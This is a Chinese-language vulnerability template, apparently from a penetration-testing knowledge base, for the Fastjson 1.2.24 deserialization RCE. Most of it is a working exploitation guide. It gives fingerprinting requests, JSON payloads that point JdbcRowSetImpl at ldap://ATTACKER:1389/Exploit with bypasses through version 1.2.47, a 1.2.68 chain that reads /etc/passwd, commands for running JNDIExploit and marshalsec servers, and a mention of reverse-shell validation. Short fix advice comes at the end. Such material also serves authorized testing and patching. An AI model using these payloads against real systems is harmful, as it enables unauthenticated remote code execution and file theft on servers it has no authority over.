---
id: Fastjson-RCE-1.2.24
title: Fastjson 1.2.24 反序列化 RCE
product: fastjson
vendor: Alibaba
version_affected: "<=1.2.24"
severity: CRITICAL
tags: [rce, deserialization, jndi, 无需认证]
fingerprint: ["fastjson", "alibaba", "com.alibaba.fastjson", "JSON parse error"]
---

## 漏洞描述

Alibaba Fastjson 1.2.24 及之前版本在解析 JSON 时支持 `@type` 指定反序列化的目标类，攻击者可以通过构造恶意 JSON，利用 JNDI 注入实现远程代码执行。

## 影响版本

- Fastjson <= 1.2.24（无需 AutoType）
- Fastjson 1.2.25-1.2.47（需要特定绕过链）
- Fastjson 1.2.48-1.2.68（需要特定绕过链）

## 前置条件

- 目标使用 Fastjson 解析 JSON 输入
- 目标 JDK 版本影响 JNDI 利用链

## 利用步骤

1. 确认目标使用 Fastjson（发送畸形 JSON 观察错误信息）
2. 准备 JNDI/LDAP 服务器
3. 发送恶意 JSON payload

## 指纹确认

```http
# 发送畸形 JSON 触发 Fastjson 特征报错
POST /api/xxx HTTP/1.1
Content-Type: application/json

{"@type":"java.lang.AutoCloseable"

# Fastjson 报错特征: "syntax error", "com.alibaba.fastjson"
# 或发送 {"a":"\x01"} 观察是否报 fastjson 特有的错误格式
```

## Payload

```json
// 1.2.24 直接利用（JDK < 8u121）
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://ATTACKER:1389/Exploit",
  "autoCommit": true
}

// 1.2.25-1.2.47 绕过
{
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://ATTACKER:1389/Exploit",
    "autoCommit": true
  }
}

// 1.2.68 绕过（需要 expectClass）
{"@type":"java.lang.AutoCloseable","@type":"com.alibaba.fastjson.JSONReader","reader":{"@type":"java.io.InputStreamReader","in":{"@type":"java.io.FileInputStream","file":"/etc/passwd"}}}
```

## JNDI 服务器搭建

```bash
# 使用 JNDIExploit
java -jar JNDIExploit.jar -i ATTACKER_IP

# 或 marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER:8888/#Exploit" 1389
```

## 验证方法

- DNS 外带: dataSourceName 指向 dnslog
- 反弹 Shell: LDAP 返回执行反弹 shell 的恶意类

## 修复建议

1. 升级 Fastjson 至 2.x（完全重写，默认安全）
2. 开启 SafeMode: `ParserConfig.getGlobalInstance().setSafeMode(true)`
